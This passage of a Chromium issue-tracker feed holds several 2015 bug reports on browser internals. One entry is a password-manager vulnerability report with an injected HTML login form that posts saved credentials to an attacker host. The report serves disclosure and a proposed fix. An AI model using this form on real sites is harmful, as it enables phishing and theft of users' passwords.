The code is\r\nroughly here:\r\nhttps://code.google.com/p/chromium/codesearch#chromium/src/chrome/browser/apps/guest_view/web_view_interactive_browsertest.cc&amp;rcl=1423457752&amp;l=1124\r\n\r\nNow the commit/confirm seems to be flaky in two ways:\r\n\r\n1) In render_widget.cc, there's a DCHECK failure sometimes:\r\n[22:22:0209/165103:FATAL:render_widget.cc(1885)] Check failed: !handling_ime_event_.\r\n#0 0x7f9a7334b0de base::debug::StackTrace::StackTrace()\r\n#1 0x7f9a7339ec62 logging::LogMessage::~LogMessage()\r\n#2 0x7f9a7c5fc182

&lt;unknown&gt;\r\n\r\n2) The other kind of failure is the text entered in [a] shows up pretty\r\nlate in the event handlers. e.g. If I move the focus back to input1 and change\r\nthe selectionRange(), what I see sometimes is that the text from composition,\r\n&quot;xxx&quot; appears *after* the selection has changed.\r\nHere are the sequence of event handlers firing in case of this failure:\r\n\r\nInitially: input1.value = &quot;abcdefgh&quot;\r\nFrom cpp we change the composition: text_input_client-&gt;SetCompositionText(&quot;xxx&quot;),\r\njs: Change focus to input2:\r\ninput1 -&gt; &quot;blur&quot; event\r\ninput2 -&gt; &quot;focus&quot; event\r\nFocus back input1,\r\ninput1 -&gt; &quot;focus&quot; event\r\nnow change the selection, e.g. input1.setSelectionRange(6, 6)\r\ninput1 -&gt; &quot;change&quot; event\r\ninput1.value = &quot;abcdefxxxgh&quot; instead of &quot;abcdefghxxx&quot;\r\n\r\nThis is happening on linux/chromeos, not on windows.\r\nMac does not have TextInputClient, so we don't run this test on mac.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/457007/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=457007"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/457007"}],"author":[{"name":{"$t":"lazyboy@chromium.org"},"uri":{"$t":"/u/lazyboy@chromium.org/"}}],"issues$id":{"$t":457007},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Platform-Apps-BrowserTag"},{"$t":"OS-Linux"},{"$t":"OS-Chrome"},{"$t":"Cr-Tests"}],"issues$owner":{"issues$uri":{"$t":"/u/lazyboy@chromium.org/"},"issues$username":{"$t":"lazyboy@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"D0UEQ347eCl7ImA9XRRQGEg.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/457004"},"published":{"$t":"2015-02-09T23:18:18.000Z"},"updated":{"$t":"2015-02-13T19:20:02.000Z"},"title":{"$t":"Invalidation

This was added when the StreamListenSocket was replaced with a StreamSocket in HttpServer in http://crrev.com/291784.\r\n\r\nA short-term fix for this problem is just to increase devtools http handler send buffer to a larger size (I've tried this and a size of ~256MB makes the test I'm running pass consistently).  However, this will just push the problem to the next person who creates a benchmark with a large amount of trace data.  \r\n\r\nIdeally the solution is either modify HttpConnection to avoid dropping packets when the send buffer get's full (although I'm not sure if we could do this and avoid blocking or using unbounded memory), or to add some back-pressure into the traceComplete protocol to ensure that we don't encounter this situation.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456845/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456845"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456845"}],"author":[{"name":{"$t":"rmcil...@chromium.org"},"uri":{"$t":"/u/108807448172896407618/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/108807448172896407618/"},"issues$username":{"$t":"rmcil...@chromium.org"}},{"issues$uri":{"$t":"/u/111694564844400160101/"},"issues$username":{"$t":"skyos...@chromium.org"}},{"issues$uri":{"$t":"/u/104750655302173056734/"},"issues$username":{"$t":"pfeld...@chromium.org"}},{"issues$uri":{"$t":"/u/byungc...@chromium.org/"},"issues$username":{"$t":"byungc...@chromium.org"}},{"issues$uri":{"$t":"/u/yurys@chromium.org/"},"issues$username":{"$t":"yurys@chromium.org"}},{"issues$uri":{"$t":"/u/105881904115301608626/"},"issues$username":{"$t":"pic...@chromium.org"}},{"issues$uri":{"$t":"/u/102113791455191111245/"},"issues$username":{"$t":"loi...@chromium.org"}},{"issues$uri":{"$t":"/u/dgozman@chromium.org/"},"issues$username":{"$t":"dgozman@chromium.org"}}],"issues$id":{"$t":456845},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Platform-DevTools-Performance"},{"$t":"OS-All"},{"$t":"Cr-Platform-DevTools"}],"issues$owner":{"issues$uri":{"$t":"/u/112216679470040408553/"},"issues$username":{"$t":"ca...@chromium.org"}},"issues$stars":{"$t":3},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"C08ERH47eCl7ImA9XRRaEEg.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456844"},"published":{"$t":"2015-02-09T16:27:55.000Z"},"updated":{"$t":"2015-04-14T22:50:05.000Z"},"title":{"$t":"New tab page needs a fix for not Full-HD-resolutions"},"content":{"$t":"UserAgent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36\r\n\r\nSteps to reproduce the problem:\r\nGoogle rolls out an new look for the 'New Tab Page' on Chrome 40.0.2214.94 m (64-bit), which is nice.

Configure IIS on WIndows 7.\r\n2. Copy attached files to wwwroot folder.\r\n3. Use following ffmpeg commands for video encoding (change input file names accordingly):\r\n\r\n&quot;C:\\usr\\bin\\ffmpeg&quot; -i &quot;C:\\Movies\\Dark Knight Rises.mp4&quot; -preset veryslow -c:a mp3 -b:a 64k -c:v libx264 -b:v 200k -pix_fmt yuv420p -map 0 -bsf:v h264_mp4toannexb -f ssegment -segment_time 10 -segment_list &quot;C:\\inetpub\\wwwroot\\video\\media_manifest.m3u8&quot; -segment_list_type hls -segment_format mpegts &quot;C:\\inetpub\\wwwroot\\video\\Dark_Knight_Rises_%10d.ts&quot; -y\r\n\r\n&quot;C:\\usr\\bin\\ffmpeg&quot; -i &quot;C:\\Movies\\Dark Knight Rises.mp4&quot; -preset veryslow -crf 0 -c:a mp3 -c:v libx264 -pix_fmt yuv420p &quot;C:\\inetpub\\wwwroot\\video\\Dark_Knight_Rises.mp4&quot; -y\r\n\r\n4. Configure MIME types in IIS.\r\n5. Go to 'localhost' on Chrome.\r\n6. Video will play the second source tag, but if you remove the second source (.mp4) from the index.html file leaving only the first source (.m3u8), video won't play. \r\n\r\nWhat is the expected behavior?\r\nThe HLS .m3u8 video should play. It plays on other browsers. It even works on Chrome for Android.\r\n\r\nWhat went wrong?\r\nVideo doesn't appear at all, it doesn't even show the 'Unsupported Browser' text. The same file works when not segmented and muxed into MPEG-2 transport stream. The full .mp4 file will play, a .webm file will play, just not the .m3u8 files.\r\n\r\nDid this work before? No \r\n\r\nIs it a problem with Flash or HTML5? HTML5\r\n\r\nDoes this work in other browsers? Yes \r\n\r\nChrome version: 40.0.2214.111  Channel: stable\r\nOS Version: 6.1 (Windows 7, Windows Server 2008 R2)\r\nFlash Version: Shockwave Flash 16.0 r0\r\n\r\nI stripped this down to the player only so forgive minor tweaks that may be needed to reproduce.

Today we return only integers.\r\n\r\nWe've changed touch events co-ordinates from integer to double and that has worked well: issue 379150.  I don't see any reason not to change mouse as well.  It should result, for example, in a smoother experience in slow drag scenarios on high-dpi devices.  But IMHO the benefit is fairly small compared to touch.  Most mouse use is still on low-DPI devices, and smoothness is more important for direct manipulation (you more easily see the relative motion between your finger and dragged object).\r\n\r\nIE 10 returns fractional values here by default (in 'standards mode') so I think this should be relatively low risk from a web compat perspective.  http://blogs.msdn.com/b/ie/archive/2012/02/17/sub-pixel-rendering-and-the-css-object-model.aspx\r\n\r\nI suspect this is relatively straight forward (following the pattern I used for touch in issue 379150), but there are probably a bunch more edge cases since mouse event code has more tendrills throughout blink.  There may be a few places we need to do something ugly to account for the lack of fractional window co-ordinate conversion APIs.  So this could turn out to be a long series of updates.\r\n\r\nAll together I'm unlikely to make this a priority for Google's input-dev team to implement (where we're focused primarily on touch).  But if others are interested in landing patches for this, I'd support that (reviews, launch process, etc.).\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456625/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456625"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456625"}],"author":[{"name":{"$t":"rby...@chromium.org"},"uri":{"$t":"/u/102622162082382831750/"}}],"issues$blockedOn":[{"issues$id":{"$t":379150},"issues$project":{"$t":"chromium"}}],"issues$cc":[{"issues$uri":{"$t":"/u/114705537736438478744/"},"issues$username":{"$t":"myid.o.s...@gmail.com"}},{"issues$uri":{"$t":"/u/111768621731422639755/"},"issues$username":{"$t":"mile...@chromium.org"}},{"issues$uri":{"$t":"/u/108642681093543133925/"},"issues$username":{"$t":"jinho.b...@samsung.com"}},{"issues$uri":{"$t":"/u/100371354084618359691/"},"issues$username":{"$t":"jdd...@chromium.org"}},{"issues$uri":{"$t":"/u/oshima@chromium.org/"},"issues$username":{"$t":"oshima@chromium.org"}},{"issues$uri":{"$t":"/u/101618685892405513938/"},"issues$username":{"$t":"tdander...@chromium.org"}}],"issues$id":{"$t":456625},"issues$label":[{"$t":"Type-Feature"},{"$t":"Pri-2"},{"$t":"Cr-Blink-Input"},{"$t":"OS-All"}],"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Available"}},{"gd$etag":"W/\"C0YBRH47eCl7ImA9XRRQFUw.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456623"},"published":{"$t":"2015-02-09T00:52:41.000Z"},"updated":{"$t":"2015-02-09T19:45:55.000Z"},"title":{"$t":"Fonts aren't appear in the PDF viewer on windows"},"content":{"$t":"scottmg,jam we're seeing this problem again where the fonts aren't getting loaded again for PDF.

This is the provider implementation to access to the remote filesystem with SFTP protocol. A localte of the repository in Github is the following:\r\n\r\nhttps://github.com/yoichiro/chromeos-filesystem-sftp\r\n\r\nCurrently, I'm facing a problem regarding &quot;copy operation&quot;. In the file system provider implementation, when the onCopyEntryRequested event occurs, the provider must copy the entry including sub-directories and files of the children recursively.\r\n\r\nIf the remote file system is supporting &quot;copy operation&quot;, its operation will be completed at short times. That is, the provider can only sent the &quot;copy&quot; command to the remote file system. These directories and files can be copied only in the remote file system server. Of course, if the number of the copied entries is large, the copy operation will take a long time. But, this is not a problem.\r\n\r\nOn the other hand, if the remote file system is NOT supporting &quot;copy operation&quot;, the provider has to the copy operation &quot;by itself&quot;. That is, the provider implementation has do the following tasks:\r\n\r\n1) Get metadatas of the entries to be copied. If a directory is specified, all sub entries must be included.\r\n2) Make the new directory into the remote target location.\r\n3) To copy files, the provider gets the file's content from the remote file system server to the local, and sends bytes in local to the remote file system as a new file.\r\n4) Repeat the step 3 as the number of the files copied.\r\n\r\nThe provider must transfer the file contents between the remote and the local. This is very long task. Chrome OS absolutely displays the warning notification. And, the provider implementation currently cannot aviod this problem.\r\n\r\nI think that the Chrome OS should support the copy operation by the Chrome OS without onCopyEntryRequested event for the remote file system which doesn't have the copy operation. That is, the Chrome OS should do the 4 steps above, when users require the file/directory copying. In this case, the provider implementation have only to support the getMetadata/readDirectory/readFile/writeFile/mkdir, and doesn't have to support the copyFile.

A web site has a login page that requires a username and a password.\r\n\r\nThe login page (http://web.site/login.html) includes the following login form.\r\n&lt;form action=&quot;login.php&quot; method=&quot;post&quot;&gt;\r\n username: &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;\r\n password: &lt;input type=&quot;password&quot; name=&quot;userpass&quot; id=&quot;userpass&quot;&gt;\r\n &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;\r\n&lt;/form&gt;\r\n\r\n The input element of type=&quot;text&quot; for username must be put immediately before the input element of type=&quot;password&quot; for password, and the two input elements must be in the same form element.\r\n \r\n2. The web site also has a page (http://web.site/vuln.html) which is vulnerable to *HTML injection*.\r\n3. A user logs in at the web site with a username and a password, and the password manager stores them.\r\n\r\n[Attack Scenario]\r\n1. The attacker modifies the vulnerable page (http://web.site/vuln.html) by injecting into it the following login form:\r\n\r\n&lt;form action=&quot;http://attacker.site/collect_password.php&quot; method=&quot;post&quot;&gt;\r\n username: &lt;input type=&quot;text&quot; name=&quot;username&quot; id=&quot;username&quot;&gt;\r\n password: &lt;input type=&quot;password&quot; name=&quot;userpass&quot; id=&quot;userpass&quot;&gt;\r\n &lt;input type=&quot;submit&quot; value=&quot;submit&quot;&gt;\r\n&lt;/form&gt;\r\n\r\nThis login form is almost the same as in the login page except that *the action attribute* indicates the attacker's password collection site.\r\n\r\n2. The attacker directs the user to access the modified page, and the user's browser shows a login form.\r\n\r\n3. When the user clicks the textbox for username, the password manager shows the list of the registered usernames. Then, if the user selects one from the list, the password manager automatically fills in the registered username and the corresponding password. If the user clicks the submit button, the username and password are sent to the attacker's page.\r\n\r\n[Vulnerability]\r\nEven when the hostname in a page's URL is the same as in the login page but the action attribute is not the same, if the username textbox is clicked and the username is selected from the suggested list of options, the password manager fills in the corresponding password.\r\n\r\n[Solution]\r\nThe password manager should store the username and password not only the hostname but also with the action attribute in the form element.\r\n\r\n[Related Attacks]\r\n RSnake pointed out the dangers of automatically filling in forms, on ha.ckers.org. WhiteScid [1] and Andrea Giammarchi [2] presented attacks for password managers in FireFox and Internet Explorer. The followings briefly describe their attacks. \r\n A web site has a login page and another page vulnerable to XSS attack. An attacker injects a JavaScript exploit program into the XSS vulnerable page.\r\n First the JavaScript exploit program logs out the web site and generates an iframe to load the login page so that the login form appears in the iframe. (If the user logged in, the login form would not appear. If the XSS vulnerable page were equal to the login page, the iframe generation would not be needed.) It focuses on the login form and selects a username from the list suggested, then the password manager fills in the login form. Finally the program sends the username and password in the login form to the attacker's page.\r\n Also see Jeremiah Grossman's great presentation on hacking autocomplete [3].\r\n\r\n[Comparison between the proposed attack and WhiteScid's and Giammarchi's attacks]\r\n Their aim is the same: to steal passwords. However, the proposed attack is a phishing attack, and WhiteScid's and Giammarchi's attacks are stealth XSS attacks.\r\n WhiteScid's and Giammarchi's attacks require JavaScript to be ON. First, if the user has logged in, the JavaScript exploit program should log out the web site. If the login page is not the XSS vulnerable page, the program generates an iframe loading the login page. It requires X-Frame-Options header not to be DENY.\r\n The proposed attack is a phishing attack and needs the user's help. It requires a page vulnerable to HTML injection. However it does not require either JavaScript to be ON, the user to log out, or X-Frame-Options to be DENY.\r\n\r\n[Another Attack Scenario]\r\nThe following form hides a password field.

Specifically, with the HTTPS version, NewTabURLDetails::ForProfile:\r\n- generates a candidate URL “https://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot;\r\n- passes it to IsValidNewTabURL, which returns NEW_TAB_URL_VALID\r\n- returns “https://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot; as the NTP URL\r\n\r\nWith the HTTP version, NewTabURLDetails::ForProfile:\r\n- generates a candidate URL “http://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot;\r\n- passes it to IsValidNewTabURL, which returns NEW_TAB_URL_INSECURE\r\n- goes to a fallback case and returns &quot;chrome-search://local-ntp/local-ntp.html&quot; (chrome::kChromeSearchLocalNtpUrl) as the NTP URL\r\n\r\nNow, let's see what happens when we actually run the test.  In the HTTP case with --site-per-process:\r\n- the test navigates to &quot;chrome://newtab/&quot;\r\n- NavigationController::CreateNavigationEntry rewrites the URL into &quot;chrome-search://local-ntp/local-ntp.html&quot; by doing BrowserURLHandlerImpl::GetInstance()-&gt;RewriteURLIfNecessary (the actual rewrite happens in chrome::HandleNewTabURLRewrite, which uses NewTabURLDetails::ForProfile above).\r\n- CreateNavigationEntry also does SetVirtualURL(&quot;chrome://newtab/&quot;)\r\n- CreateNavigationEntry also sets set_update_virtual_url_with_url(reverse_on_redirect) -&gt; true\r\n- navigation proceeds\r\n- DidCommitProvisionalLoad is received, which calls NavigationControllerImpl::RendererDidNavigateToNewPage(), which does:\r\n    ...\r\n    new_entry = new NavigationEntryImpl(*pending_entry_);\r\n    update_virtual_url = new_entry-&gt;update_virtual_url_with_url();\r\n    ...\r\n    if (update_virtual_url) // TRUE due to doing RewriteURLIfNecessary above\r\n      UpdateVirtualURLToURL(new_entry, params.url);\r\n\r\n- UpdateVirtualURLToURL calls BrowserURLHandlerImpl::ReverseURLRewrite, which reverses &quot;chrome-search://local-ntp/local-ntp.html&quot; into &quot;chrome://newtab/&quot;, and does a SetVirtualURL to set the navigation entry's virtual URL to chrome://newtab/.\r\n- this is returned to the test when it checks browser()-&gt;tab_strip_model()-&gt;GetActiveWebContents()-&gt;GetURL(), and everything is fine.\r\n\r\nIn the HTTPS case with --site-per-process:\r\n- the test navigates to &quot;chrome://newtab/&quot;\r\n- CreateNavigationEntry rewrites the URL into &quot;https://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot;\r\n- CreateNavigationEntry does a SetVirtualURL(&quot;chrome://newtab/&quot;)\r\n- CreateNavigationEntry does a set_update_virtual_url_with_url(true)\r\n- we end up in a site instance with a Site URL &quot;chrome-search://remote-ntp/&quot;, because this is what ChromeContentBrowserClient::GetEffectiveURL() returns to SiteInstanceImpl::GetEffectiveURL(&quot;https://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot;)\r\n- loading &quot;https://www.google.com/_/chrome/newtab?espv=2&amp;ie=UTF-8&quot; generates a renderer-side redirect (going through blink::DocumentLoader::redirectReceived) to &quot;chrome-search://local-ntp/local-ntp.html&quot;\r\n- when loading &quot;chrome-search://local-ntp/local-ntp.html&quot;, the CrossSiteResourceHandler in the browser process does a CheckNavigationPolicyOnUI, which compares the current site URL &quot;chrome-search://remote-ntp/&quot; to the new URL &quot;chrome-search://local-ntp/local-ntp.html&quot; and decides to switch processes.\r\n- we end up going through RFHM::OnCrossSiteResponse, NavigatorImpl::RequestTransferURL, WebContentsImpl::RequestOpenURL, ... , NavigationController::CreateNavigationEntry.\r\n- CreateNavigationEntry creates a new entry for &quot;chrome-search://local-ntp/local-ntp.html&quot;, but this time, RewriteURLIfNecessary doesn't rewrite it to anything, and sets the virtual URL to &quot;chrome-search://local-ntp/local-ntp.html&quot; and reverse_on_redirect to false.  At this point, we've lost the virtual URL with which we started this whole navigation.\r\n- DidCommitProvisionalLoad calls RendererDidNavigateToNewPage, which checks the reverse_on_redirect bit (it's false) and doesn't do UpdateVirtualURLToURL as in the HTTP case.\r\n- the test sees the navigation entry's virtual URL as &quot;chrome-search://local-ntp/local-ntp.html&quot; and fails.\r\n\r\nThe list of other affected tests from the FYI bot:\r\nStartupBrowserCreatorTest.ProfilesWithoutPagesNotLaunched\r\nExtensionApiTest.TabMove\r\nAllUrlsApiTest.WhitelistedExtension\r\nExtensionURLRewriteBrowserTest.NewTabPageURL\r\nPolicyTest.HomepageLocation\r\nRestoreOnStartupPolicyTestInstance/RestoreOnStartupPolicyTest.RunTest/3\r\nRestoreOnStartupPolicyTestInstance/RestoreOnStartupPolicyTest.RunTest/1\r\nBrowserNavigatorTest.NavigateFromNTPToOptionsInSameTab\r\n\r\n","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456420/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456420"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456420"}],"author":[{"name":{"$t":"alex...@chromium.org"},"uri":{"$t":"/u/110010223395939269054/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/110010223395939269054/"},"issues$username":{"$t":"alex...@chromium.org"}},{"issues$uri":{"$t":"/u/nasko@chromium.org/"},"issues$username":{"$t":"nasko@chromium.org"}}],"issues$id":{"$t":456420},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Internals-Sandbox-SiteIsolation"},{"$t":"OS-All"}],"issues$owner":{"issues$uri":{"$t":"/u/creis@chromium.org/"},"issues$username":{"$t":"creis@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"DEAEQ347eCl7ImA9XRRVEUw.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456419"},"published":{"$t":"2015-02-07T02:37:55.000Z"},"updated":{"$t":"2015-03-11T23:31:42.000Z"},"title":{"$t":"Migrate Chromoting client XMPP connection from chrome.socket to chrome.sockets.tcp API"},"content":{"$t":"Migrate Chromoting client XMPP connection from chrome.socket to chrome.sockets.tcp API.\r\n\r\nThe old API has process lifetime management issues that require messy workarounds in the app.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456419/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456419"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456419"}],"author":[{"name":{"$t":"wez@chromium.org"},"uri":{"$t":"/u/wez@chromium.org/"}}],"issues$blocking":[{"issues$id":{"$t":449718},"issues$project":{"$t":"chromium"}}],"issues$closedDate":{"$t":"2015-03-11T23:29:35.000Z"},"issues$id":{"$t":456419},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Services-Chromoting"},{"$t":"OS-All"},{"$t":"M-43"}],"issues$owner":{"issues$uri":{"$t":"/u/sergeyu@chromium.org/"},"issues$username":{"$t":"sergeyu@chromium.org"}},"issues$stars":{"$t":1},"issues$state":{"$t":"closed"},"issues$status":{"$t":"Fixed"}},{"gd$etag":"W/\"DkUFSX47eCl7ImA9XRRWEEU.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456418"},"published":{"$t":"2015-02-07T02:26:35.000Z"},"updated":{"$t":"2015-02-28T00:43:38.000Z"},"title":{"$t":"HW Video decoding with DX11"},"content":{"$t":"Currently we do GPU assisted video decode using MediaFoundation + DX9, but in many cases we use now DX11 in the compositor side.\r\n\r\nIt has been said that the DX9 surface to DX11 interop might be the cause for slowness (or worse things) that happens.

Essentially, the issue is that if you manually configure Custom Name servers for a network via chrome://settings, disconnect from that network and re-connect using the &quot;Automatic name servers&quot; option then the Custom DNS values will be lost. \r\n\r\nRepro steps:\r\n- Boot up device, log in as user. Confirm current DNS settings for active Wifi network as &quot;Automatic name servers&quot; identified as 8.8.4.4 / 8.8.8.8. \r\n- Select &quot;Custom name servers&quot;, defaults to 8.8.4.4 / 8.8.8.8. \r\n- Close network settings dialogue, reopen dialogue. DNS option now set to &quot;Google name servers&quot;. \r\n- Select &quot;Custom name servers&quot;, defaults to 8.8.4.4 / 8.8.8.8. Configure as 208.67.222.222 / 208.67.220.220. \r\n- Close network setting dialogue, reopen dialogue. DNS option still set as &quot;Custom name servers&quot; and configured as 208.67.222.222 / 208.67.220.220. \r\n- Disconnect from network, this autocloses the network dialogue, reopen dialogue without connecting. DNS option now set to &quot;Automatic name servers&quot; with no identification as to those settings. Select &quot;Customer name servers&quot;, defaults to 208.67.222.222 / 208.67.220.220. \r\n- Connect to network, this autocloses the network dialogue, reopen dialogue. DNS option still set as &quot;Custom name servers&quot; and configured as 208.67.222.222 / 208.67.220.220. \r\n- Disconnect from network, his autocloses the network dialogue, reopen dialogue.

These prompts currently route though ContentBrowserClient (client auth) and ResourceDispatcherHostDelegate (http auth). They eventually go to the UI thread and attach a modal dialog to the WebContents. Instead, the WebContents lookup and thread hop should happen within //content and be exposed at WebContentsDelegate. The WebContents embedder knows how to show a prompt, if at all. (Default behavior will be to not show anything.) Making the WebContents lookup consistently happen within content also means that WebContentsless contexts (SharedWorker) have consistent behavior across all embedders. This is useful for both testing and because that behavior is a web platform decision so should be in content.\r\n\r\nIt's possible that, for client auth, we'll want both CBC and WCD hooks. The CBC hook currently applies prefs and we probably need AutoSelectCertificateForUrls to happen automatically in all contexts.\r\n\r\nFor HTTP auth, only Browser currently shows a prompt, but only on accident. Other WebContentses don't have a password manager. Without this, it would probably crash or have the same problems.","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456255/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456255"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456255"}],"author":[{"name":{"$t":"davidben@chromium.org"},"uri":{"$t":"/u/davidben@chromium.org/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/mmenke@chromium.org/"},"issues$username":{"$t":"mmenke@chromium.org"}}],"issues$id":{"$t":456255},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Internals-Network-Auth"},{"$t":"OS-All"},{"$t":"Cr-Internals-Network-SSL"}],"issues$owner":{"issues$uri":{"$t":"/u/davidben@chromium.org/"},"issues$username":{"$t":"davidben@chromium.org"}},"issues$stars":{"$t":2},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"Ak4AQX47eCl7ImA9XRRQF04.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456253"},"published":{"$t":"2015-02-06T20:30:54.000Z"},"updated":{"$t":"2015-02-12T11:02:20.000Z"},"title":{"$t":"ChromeOffice does not un-minimize windows when opening documents"},"content":{"$t":"Google Chrome: 41.0.2272.32 (Official Build) dev\r\nRevision: 1ab8796c2b54b298c48c54dd7532851917d11a55\r\nPlatform: 6680.17.0 (Official Build) dev-channel panther\r\nBlink: 537.36 (@188882)\r\nJavaScript: V8 4.1.0.13\r\nFlash: 16.0.0.296-r1\r\n\r\nTo reproduce:\r\n  Download a docx file\r\n  Minimize all browser windows\r\n  Open the file manager\r\n  Double click the docx file in the file manager\r\n\r\nExpected behavior:\r\n  Window is un-minimized\r\n\r\nActual behavior:\r\n  Window remains minimized but the file is opened in a new tab\r\n\r\nNotes:\r\n  This doesn't happen with files that are not opened in Chrome Office","type":"html"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http://code.google.com/feeds/issues/p/chromium/issues/456253/comments/full"},{"rel":"alternate","type":"text/html","href":"http://code.google.com/p/chromium/issues/detail?id=456253"},{"rel":"self","type":"application/atom+xml","href":"https://code.google.com/feeds/issues/p/chromium/issues/full/456253"}],"author":[{"name":{"$t":"kr...@chromium.org"},"uri":{"$t":"/u/105814072820386529648/"}}],"issues$cc":[{"issues$uri":{"$t":"/u/106644771327561496936/"},"issues$username":{"$t":"h...@chromium.org"}}],"issues$id":{"$t":456253},"issues$label":[{"$t":"Type-Bug"},{"$t":"Pri-2"},{"$t":"Cr-Platform-Apps-Default-ChromeOffice-Word"},{"$t":"OS-Chrome"},{"$t":"Cr-Platform-Apps-Default-ChromeOffice"},{"$t":"Infra-Client-ChromeOffice"},{"$t":"qotransition"}],"issues$owner":{"issues$uri":{"$t":"/u/106644771327561496936/"},"issues$username":{"$t":"h...@chromium.org"}},"issues$stars":{"$t":3},"issues$state":{"$t":"open"},"issues$status":{"$t":"Assigned"}},{"gd$etag":"W/\"DEMER347eCl7ImA9XRRWFEQ.\"","id":{"$t":"http://code.google.com/feeds/issues/p/chromium/issues/full/456252"},"published":{"$t":"2015-02-06T20:30:34.000Z"},"updated":{"$t":"2015-03-04T19:13:26.000Z"},"title":{"$t":"vorbis decoder adds one sample in decodeAudioData (webaudio)"},"content":{"$t":"UserAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2292.0 Safari/537.36\r\n\r\nExample URL:\r\nhttp://jsfiddle.net/nqg226wf/\r\n\r\nSteps to reproduce the problem:\r\n1.

Since the matching is done by Title and URL only this algorithm might pick a wrong node. This leads to two issues:\r\n\r\n1) During association process picking a wrong folder would result in duplicating all the entire node subtree between the two swapped folders. Reproducing this is easy - just create a few folders with exactly the same name  and place some bookmarks in one of the folders. On restart, once the association is done, the same bookmarks might get cloned in one more folder. Whether or not this reproduces, depends on internal order of folders in BookmarkNodeFinder which is arbitrary.\r\n\r\n2) The situation is even worse in the code that deletes bookmarks matching DeleteJournal entries in the beginning of association. It scans the tree recursively using the same BookmarkNodeFinder based matching on title / URL. This mean that it might randomly match native model nodes anywhere in the tree and delete them. \r\nThe nodes that should have been deleted remain and cause the association process to recreate them in the sync directory. So this would delete wrong nodes and undelete nodes that user has deleted.\r\n\r\nProposed fix: Use sync node external ID (which is ID in the native model) to matching when there are multiple 